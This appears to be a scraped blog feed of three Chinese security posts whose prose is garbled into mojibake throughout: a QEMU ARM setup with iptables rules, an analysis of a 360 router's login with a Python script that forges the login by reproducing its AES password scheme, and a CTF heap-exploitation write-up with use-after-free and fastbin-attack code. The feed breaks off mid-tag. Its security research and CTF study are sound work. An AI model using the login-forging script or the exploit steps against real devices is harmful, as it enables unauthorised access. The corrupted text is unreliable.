mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line"></span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o enp0s25 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment">#inet_ip=192.168.100.2</span></span><br><span class="line"></span><br><span class="line">sudo iptables -t nat -A PREROUTING -i enp0s25 -p tcp --dport 1022 -j DNAT --to-destination <span class="variable">$inet_ip</span>:22</span><br><span class="line">sudo iptables -t nat -A PREROUTING -i enp0s25 -p tcp --dport 1080 -j DNAT --to-destination <span class="variable">$inet_ip</span>:80</span><br><span class="line">sudo iptables -t nat -A PREROUTING -i enp0s25 -p tcp --dport 10443 -j DNAT --to-destination <span class="variable">$inet_ip</span>:443</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Booting VM, eta 10 seconds&quot;</span></span><br><span class="line">sleep 10</span><br><span class="line">sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0</span><br></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œæˆ‘ä»¬çš„åµŒå…¥å¼è™šæ‹Ÿç¯å¢ƒå°±æ­å»ºå¥½äº†ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://gist.github.com/takeshixx/686a4b5e057deff7892913bf69bcb85a">ubuntu-xenial-armfh-qemu.md</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒé…ç½® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åµŒå…¥å¼ç¯å¢ƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>360 è·¯ç”±å™¨ P2 ç™»é™†éªŒè¯åˆ†æ</title>
      <link href="360_P2_Router_login_analysis.html"/>
      <url>360_P2_Router_login_analysis.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h3 id="æµé‡åˆ†æ"><a href="#æµé‡åˆ†æ" class="headerlink" title="æµé‡åˆ†æ"></a>æµé‡åˆ†æ</h3><p>ç”±äºæŸäº›éœ€æ±‚ï¼Œéœ€è¦ä¼ªé€ ä¸ªç™»é™†è¿‡ç¨‹ï¼Œç„¶åå°±èŠ±äº†ç‚¹æ—¶é—´åˆ†æäº†ä¸‹è¿‡ç¨‹ã€‚ç”±äºæˆ‘æ‹¿åˆ°çš„æ˜¯æ¿å­è€Œä¸”æ˜¯å¼€å‘æ¿ï¼Œæˆ‘æ‹¥æœ‰ telnet æ¥å£ã€‚äºæ˜¯æˆ‘ telnet ä¸Šå»ç”¨ tcpdump æŠ“å–äº†æµé‡ã€‚</p><p><code>tcpdump -i any -w target.cap</code></p><p>ä¸ºä»€ä¹ˆæˆ‘ä¸åœ¨æœ¬åœ°æŠ“æœ¬åœ° web ç™»å½•çš„æµé‡å‘¢ï¼Ÿ å› ä¸ºæˆ‘é‚£ä¸ªæ—¶å€™åœ¨åš App ä¸€äº›åŠŸèƒ½æµ‹è¯•ã€‚æˆ‘éœ€è¦æŠ“å–å…¨éƒ¨ç»è¿‡è·¯ç”±å™¨çš„æµé‡ã€‚</p><p>ç„¶åæˆ‘éœ€è¦æŠŠ cap æ–‡ä»¶æ‹¿å‡ºæ¥ã€‚ç”±äºæ˜¯åœ¨æ¿å­é‡Œé¢ï¼Œè™½ç„¶ DEBUG ç‰ˆæœ¬ç”¨äº tftp å¯ä»¥åšç®€å•çš„æ–‡ä»¶ä¼ è¾“ã€‚ä½†æ˜¯ç”±äºéœ€è¦ä¸€ä¸ª server æœåŠ¡å™¨ã€‚æ‰€ä»¥æˆ‘è¿™é‡Œéœ€è¦åœ¨æœ¬åœ°æ­å»ºä¸€ä¸ª tftp serverã€‚è¸©äº†ä¸€ä¸ªå‘..æœ€åç”¨ Python ç°æœ‰çš„æ¨¡å—ä¸¤å¥è¯å®Œæˆã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tftpy</span><br><span class="line"></span><br><span class="line">server = tftpy.TftpServer(<span class="string">&#x27;/tftpboot&#x27;</span>)</span><br><span class="line">server.listen(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">69</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åèµ· serverï¼Œç´§æ¥ç€åœ¨æ¿å­é‡Œä½¿ç”¨ï¼š</p><p><code>tftp -l target.cap -p 192.168.0.4</code> (192.168.0.4 æ˜¯æˆ‘æœ¬åœ°çš„ ip ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªæ—¶å€™çš„ server)</p><p>æ‹¿åˆ°æµé‡åç”¨ wireshark æ‰“å¼€åˆ†æï¼Œæˆ‘è¿‡æ»¤äº† HTTP æµå‘ˆç°çš„æ•ˆæœå¦‚ä¸‹ï¼š</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180911174710.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180911174710.png"></a></p><p>ä¸»è¦æ˜¯åˆ†æéªŒè¯ç™»é™†è¿‡ç¨‹å…³é”®åœ°æ–¹åœ¨ <strong>web_login.cgi ** å’Œ **get_rand_key.cgi</strong></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180911174806.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180911174806.png"></a></p><p>é¦–å…ˆç™»é™†çš„æ—¶å€™ï¼Œå…ˆä» <strong>get_rand_key</strong> è·å–ä¸€ä¸ª <strong>rand_key</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /router/get_rand_key.cgi HTTP/1.1</span><br><span class="line">Referer: http://guanli.luyou.360.cn</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line">Host: guanli.luyou.360.cn</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">User-Agent: okhttp/3.7.0</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Boa/0.94</span><br><span class="line">Date: Sat, 21 Dec 2013 12:00:00 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;rand_key&quot;</span>:<span class="string">&quot;9332c90abc850ef93f9a600eff5606ba20c9bdd11c07c704a9b8e3faddbfd713&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª <strong>rand_key</strong> æ˜¯ç›´æ¥ post <strong>/router/get_rand_key.cgi</strong> å°±å¯ä»¥ç›´æ¥è·å–åˆ°ã€‚</p><p>ç´§æ¥ç€å‘ <strong>web_login_cgi</strong> post æ•°æ®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /router/web_login.cgi HTTP/1.1</span><br><span class="line">Referer: http://guanli.luyou.360.cn</span><br><span class="line">token_id: 6887b2151fdc73069d8ff84c164b7ced</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 268</span><br><span class="line">Host: guanli.luyou.360.cn</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">User-Agent: okhttp/3.7.0</span><br><span class="line"></span><br><span class="line">bindLanguage=eyJsYW5ndWFnZSI6IjEifQ%3D%3D&amp;density=420&amp;language=1&amp;language_server=zh&amp;ostype=android&amp;osversion=27&amp;pass=9332c90abc850ef93f9a600eff5606ba5328c9362bc131db6047cfbc481523f9&amp;phonetype=ONEPLUS%20A5010&amp;region=CN&amp;screenx=1080&amp;screeny=2160&amp;user=admin&amp;version=4.2.3HTTP/1.1 200 OK</span><br><span class="line">Set-Cookie: Qihoo_360_login=c0bd8fc56b6bcdb5192cd56d9c437763;path=/</span><br><span class="line">Connection: close</span><br><span class="line">content-type: text/plain; charset=UTF-8</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;success&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;token_id&quot;</span>:<span class="string">&quot;704420fad014228d75b98f9341d79c2f&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„å­—æ®µä¼šç”¨åˆ°ä¸€ä¸ªå« pass çš„ï¼š</p><p> <code>pass = 9332c90abc850ef93f9a600eff5606ba5328c9362bc131db6047cfbc481523f9</code></p><p>æˆ‘ä»¬ä¼šå‘ç° pass ä¸ä¸Šé¢çš„ rand_key :</p><p>9332c90abc850ef93f9a600eff5606ba20c9bdd11c07c704a9b8e3faddbfd713,å‰32 ä½ä¸€è‡´ï¼Œå32ä½ä¸ä¸€æ ·ã€‚</p><h3 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180911175940.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180911175940.png"></a></p><p>ç®€å•åˆ†æä¸‹ä»£ç ï¼š</p><p>str æ˜¯ è·¯ç”±å™¨çš„ç®¡ç†å¯†ç ï¼Œæœ€åå½¢æˆçš„ pass ç”± rand_key çš„å32ä½å¯¹ str è¿›è¡Œ AES åŠ å¯†ï¼ŒåŠ å¯†ç»“æœå†ä¸ rank_key å‰32ä½æ‹¼æ¥ã€‚</p><p>ç®€å•çš„è®²å°±æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rand_key &#x3D; &#39;9332c90abc850ef93f9a600eff5606ba20c9bdd11c07c704a9b8e3faddbfd713&#39;</span><br><span class="line">pass &#x3D; &#39;9332c90abc850ef93f9a600eff5606ba5328c9362bc131db6047cfbc481523f9&#39;</span><br><span class="line"></span><br><span class="line">ran_key[:32] &#x3D;&#x3D; pass[:32]</span><br><span class="line">pass[32:] &#x3D; EnAES(passwd,rand_key[32:])</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Python-æ¨¡æ‹Ÿç™»é™†è¿‡ç¨‹"><a href="#Python-æ¨¡æ‹Ÿç™»é™†è¿‡ç¨‹" class="headerlink" title="Python æ¨¡æ‹Ÿç™»é™†è¿‡ç¨‹"></a>Python æ¨¡æ‹Ÿç™»é™†è¿‡ç¨‹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> pkcs7 <span class="keyword">import</span> PKCS7Encoder</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># key = &#x27;\xf7\x44\x50\xb1\x2a\x1e\x6e\x9e\xae\x36\xd4\x01\xfb\x5d\x48\xc2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># key = &#x27;\x20\xc9\xbd\xd1\x1c\x07\xc7\x04\xa9\xb8\xe3\xfa\xdd\xbf\xd7\x13&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">EnAES</span>(<span class="params">key</span>):</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">&#x27;\x33\x36\x30\x6c\x75\x79\x6f\x75\x40\x69\x6e\x73\x74\x61\x6c\x6c&#x27;</span> <span class="comment">#&quot;360luyou@install&quot;.decode(&#x27;hex&#x27;)</span></span><br><span class="line">    encryptor = AES.new(key, mode, iv)</span><br><span class="line">    encoder = PKCS7Encoder()</span><br><span class="line">    text = <span class="string">&#x27;******&#x27;</span> <span class="comment"># password</span></span><br><span class="line">    pad_text = encoder.encode(text)</span><br><span class="line">    cipher = encryptor.encrypt(pad_text).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    <span class="comment"># enc_cipher = base64.b64encode(cipher)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print enc_cipher</span></span><br><span class="line">    <span class="comment"># print type(enc_cipher)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>(str(cipher))</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">&#x27;http://192.168.0.1/router/get_rand_key.cgi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">key = r.content</span><br><span class="line">key = eval(key)</span><br><span class="line"></span><br><span class="line">rand_key = key[<span class="string">&#x27;rand_key&#x27;</span>]</span><br><span class="line">aes_key =  key[<span class="string">&#x27;rand_key&#x27;</span>][<span class="number">32</span>:].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;bindLanguage=eyJsYW5ndWFnZSI6IjEifQ==&amp;density=420&amp;language=1&amp;language_server=zh&amp;ostype=android&amp;osversion=27&amp;pass=&#123;&#125;&amp;phonetype=ONEPLUS%20A5010&amp;region=CN&amp;screenx=1080&amp;screeny=2160&amp;user=admin&amp;version=4.2.3&#x27;</span>.format(key[<span class="string">&#x27;rand_key&#x27;</span>][:<span class="number">32</span>]+EnAES(aes_key))</span><br><span class="line"></span><br><span class="line">header = <span class="string">&#x27;...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r = requests.post(&#x27;</span>http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>/router/web_login.cgi<span class="string">&#x27;,data =data)</span></span><br><span class="line"><span class="string">print r.text&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180911180642.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180911180642.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> router </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼æ¯ babyheap writeup</title>
      <link href="2018-wd-babyheap-writeup.html"/>
      <url>2018-wd-babyheap-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æˆ‘çœ‹ç¤¾åŒºå·²ç»æœ‰äººåœ¨å‘Writeupäº†ï¼Œä½†æ˜¯ä¹Ÿä¸æ˜¯ç‰¹åˆ«å…¨ã€‚å…¶ä¸­ Pwn éƒ¨åˆ†å°‘äº†ä¸ªbabyheapçš„é¢˜è§£ã€‚æˆ‘åœ¨è¿™é‡Œç¨å¾®è¡¥å……ä¸‹ã€‚</p><p>link: <a href="https://xz.aliyun.com/t/2609">https://xz.aliyun.com/t/2609</a></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="0x01-åˆ†æ"><a href="#0x01-åˆ†æ" class="headerlink" title="0x01 åˆ†æ"></a>0x01 åˆ†æ</h3><p>é¢˜ç›®å››ä¸ªåŠŸèƒ½ï¼Œåˆ†åˆ«æ˜¯newï¼Œchangeï¼Œshowå’Œdeleteã€‚æ¼æ´å¾ˆæ˜æ˜¾åœ¨äºdeleteå‡½æ•°ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821171904.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821171904.png"></a></p><p>åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œå­˜åœ¨æŒ‡é’ˆæœªç½®é›¶çš„æƒ…å†µï¼Œå¯ä»¥é€ æˆUAF ã€‚</p><p>å…¶æ¬¡æœ‰å‡ ä¸ªæ³¨æ„çš„ç‚¹ å—åªèƒ½æ–°å»º9å—ï¼Œä»¥åŠæ–°å»ºå—çš„å¤§å°ä¸º 0x20 ï¼Œä¸å¯æ§ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821172601.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821172601.png"></a></p><p>ç¼–è¾‘ä¸€ä¸ªå—æœ€å¤šåªèƒ½ä¸‰æ¬¡ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821172718.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821172718.png"></a></p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h3 id="0x02-åˆ©ç”¨æ€è·¯"><a href="#0x02-åˆ©ç”¨æ€è·¯" class="headerlink" title="0x02 åˆ©ç”¨æ€è·¯"></a>0x02 åˆ©ç”¨æ€è·¯</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@8593c2d5ac83:/home/wd/babyheap/babyheap<span class="comment"># checksec babyheap</span></span><br><span class="line">[*] <span class="string">&#x27;/home/wd/babyheap/babyheap/babyheap&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>ç”±äºå—çš„å¤§å°æ˜¯ 0x20 ï¼Œå¯ä»¥æƒ³åˆ°æ˜¯ç»å…¸çš„fastbins attack + uafã€‚</p><h4 id="ç¬¬ä¸€æ­¥ï¼šæ€è€ƒ-å¦‚ä½•æ³„éœ²å‡º-libc-åœ°å€"><a href="#ç¬¬ä¸€æ­¥ï¼šæ€è€ƒ-å¦‚ä½•æ³„éœ²å‡º-libc-åœ°å€" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šæ€è€ƒ å¦‚ä½•æ³„éœ²å‡º libc åœ°å€"></a>ç¬¬ä¸€æ­¥ï¼šæ€è€ƒ å¦‚ä½•æ³„éœ²å‡º libc åœ°å€</h4><p>ç”±äºæˆ‘ä»¬éœ€è¦æœ€ç»ˆéœ€è¦çŸ¥é“ libc base æ¥æ„é€ æœ€åçš„getshell payloadã€‚é‚£ä¹ˆç¬¬ä¸€ä¸ªæ€è·¯æ˜¯é€šè¿‡fake ä¸€ä¸ªchunkï¼Œè®©å®ƒåˆ†é…åˆ° unsortedbin ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“å½“ä¸€ä¸ªchunk åœ¨ unsortedbinä¸­çš„æ—¶å€™ï¼Œå®ƒçš„fdä¼šæŒ‡å‘ main_arena</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821173300.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821173300.png"></a></p><p>ç”±äº UAF æ¼æ´çš„å­˜åœ¨ï¼Œæˆ‘ä»¬è¿™ä¸ªæ—¶å€™å» show è¿™ä¸ªchunk çš„æ—¶å€™ç¨‹åºä¼šå°†ä»– fdçš„å†…å®¹æ‰“å°å‡ºæ¥ã€‚è¿™ä¸ªæ—¶å€™å°±èƒ½æ³„éœ²å‡º libcåœ°å€ã€‚</p><p>ä½†æ˜¯è¦fake ä¸€ä¸ªchunkæˆ‘ä»¬éœ€è¦heapçš„åœ°å€ã€‚æ‰€ä»¥æˆ‘ä»¬é¦–å…ˆå» æ³„éœ²  heap åœ°å€ã€‚</p><h4 id="ç¬¬äºŒæ­¥-æ³„éœ²-heap-åœ°å€ã€‚"><a href="#ç¬¬äºŒæ­¥-æ³„éœ²-heap-åœ°å€ã€‚" class="headerlink" title="ç¬¬äºŒæ­¥ æ³„éœ² heap åœ°å€ã€‚"></a>ç¬¬äºŒæ­¥ æ³„éœ² heap åœ°å€ã€‚</h4><p>ç”±äºfastbins çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬è¿ç»­ free ä¸¤ä¸ªchunkï¼Œè¿™ä¸ªæ—¶å€™ä¼šäº§ç”Ÿä¸€ä¸ª fastbins çš„freelistã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821173736.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821173736.png"></a></p><p>è¿™ä¸ªæ—¶å€™ 0x603000 çš„chunk çš„fd æŒ‡å‘ 0x603030 ï¼Œæˆ‘ä»¬åªéœ€è¦ show ä¸€ä¸‹ 0x603000è¿™ä¸ªchunkï¼Œå°±èƒ½å¾—åˆ°heapåœ°å€ï¼š0x603030ã€‚<strong>æ³¨æ„ï¼Œputs å­˜åœ¨æˆªæ–­ï¼Œå¦‚æœä½ æ˜¯ 0x603030  â€“&gt; 0x603000</strong> ä¼šå­˜åœ¨ leak ä¸å‡ºæ¥çš„é—®é¢˜ã€‚æ‰€ä»¥æ³¨æ„ free çš„é¡ºåºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#leak heap addr</span></span><br><span class="line">Show(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(p.recvline()[ : <span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_addr:&#123;&#125;&#x27;</span>.format(hex(heap_addr)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="ç¬¬ä¸‰æ­¥-æ³„éœ²libc-åœ°å€"><a href="#ç¬¬ä¸‰æ­¥-æ³„éœ²libc-åœ°å€" class="headerlink" title="ç¬¬ä¸‰æ­¥ æ³„éœ²libc åœ°å€"></a>ç¬¬ä¸‰æ­¥ æ³„éœ²libc åœ°å€</h4><p>è¦ fake ä¸ªchunk ç„¶åè®©å®ƒ free ä¹‹åè¢«æ”¾åˆ° unsortedbin ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ fastbins attack + overlap ã€‚</p><p>æˆ‘ä»¬é€šè¿‡ç¼–è¾‘ chunk 0 çš„ fd è®©ä»–æŒ‡å‘ åŸæœ¬ fd-0x20çš„ä½ç½®ã€‚å½“æˆ‘ä»¬æŠŠ chunk 0 å’Œ chunk 1 é‡æ–°ç”³è¯·å›æ¥åã€‚ï¼ˆfastbinsçš„ç‰¹æ€§ï¼šåé‡Šæ”¾çš„ï¼Œå…ˆè¢«ä½¿ç”¨ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Edit(<span class="number">0</span>, p64(heap_addr + <span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line">Add(<span class="number">6</span>, p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">7</span>, p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¹¶ä¿®æ”¹ size å’Œfdç­‰ç­‰ã€‚ç”±äºï¼Œchunk 6çš„fdè¢«ä¿®æ”¹äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å»ä¿®æ”¹ chunk 7çš„æ—¶å€™ï¼Œå…¶å®å°±æ˜¯åœ¨ä¿®æ”¹æˆ‘ä»¬æ­£å¸¸chunkçš„sizeã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x603020:       0x0000000000000000      0x0000000000000031       &lt;-- fake chunk</span><br><span class="line">0x603030:       0x0000000000000000      0x00000000000000a1       &lt;--- fake chunk size</span><br><span class="line">0x603040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603050:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603060:       0x0000000000000000      0x0000000000000031</span><br><span class="line">0x603070:       0x4343434343434343      0x0000000000000000</span><br><span class="line">0x603080:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603090:       0x0000000000000000      0x0000000000000031</span><br><span class="line">0x6030a0:       0x4444444444444444      0x0000000000000000</span><br><span class="line">0x6030b0:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>ä¼ªé€ åçš„ chunk ç”±äºæˆ‘ä»¬è®¾ç½®äº† size å˜å¤§äº†ï¼Œæ‰€ä»¥é»˜è®¤ä¼šæŠŠåé¢çš„ chunk ç»™åå¹¶ã€‚æˆ‘ä»¬ åœ¨è®¾ç½®åŸºæœ¬å—çš„æ—¶å€™è¦æ³¨æ„è¿™ä¸ªé—®é¢˜ã€‚</p><p>è¿™ä¸ªæ—¶å€™ç³»ç»Ÿä¼šè®¤ä¸º 0x603020 è¿™ä¸ªä¼ªé€ çš„ chunk æ˜¯å­˜åœ¨çš„ã€‚æ‰€ä»¥å½“æˆ‘ä»¬å» delete chunk 1ã€‚ï¼ˆç”±äºchunk 1æ˜¯åé‡Šæ”¾ï¼Œæ‰€ä»¥ç”³è¯·åˆ°çš„chunk 7 æŒ‡å‘çš„å…¶å®æ˜¯åŒä¸€ä¸ªå—ï¼‰ã€‚ç³»ç»Ÿä¼šæŠŠ 0x603020 æ”¾åˆ°unsortedbinä¸­ã€‚ï¼ˆunsortedbin ä¸æ˜¯fastbins ä¸”ä¸ä¸ top chunk ç´§é‚»ï¼Œfreeåä¼šè¢«æ”¾ç½®åˆ°unsortedbinä¸­ï¼‰</p><p>ç´§æ¥ç€ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠè¿™ä¸ª chunk free äº†ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821173300.png" class="gallery-item"><img 